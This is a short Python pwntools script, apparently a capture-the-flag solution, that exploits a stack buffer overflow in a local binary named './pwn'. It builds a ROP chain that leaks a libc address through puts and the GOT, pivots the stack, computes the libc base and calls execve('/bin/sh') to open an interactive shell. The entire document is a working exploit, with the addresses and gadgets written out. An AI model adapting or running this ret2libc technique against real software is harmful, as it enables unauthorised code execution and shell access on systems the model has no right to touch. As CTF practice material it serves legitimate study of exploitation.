from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal=['tmux','split','-h']
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

p=process('./pwn')
sla 		= lambda a,b: p.sendlineafter(a,b)
sa 			= lambda a,b: p.sendafter(a,b)
ra 			= lambda a: p.readuntil(a)
main = 0x40059c
got  = 0x601018
rdi  = 0x400633
puts = 0x400430
main = 0x40059c
rsi = 0x0000000000400631
read = 0x400440
pay = "A"*0x80+flat([0,rdi,got,puts])
pay += flat([rdi,0,rsi,0x601130,0,read])
gdb.attach(p,'b * 0x4005cc')

p.send(pay.ljust(0x100,"A"))#leak
#stack pivot
sa("\n","A"*0x100+p64(0x601060+0x80))
base = u64(p.readline()[:-1]+'\0\0') - libc.sym['puts']
log.warning(hex(base)) 

libc.address = base 
rsi = 0x00000000000202f8+base
rdx = 0x0000000000001b92+base
p.send(flat(rdi,libc.search("/bin/sh").next(),rsi,0,rdx,0,libc.sym['execve']))

p.interactive()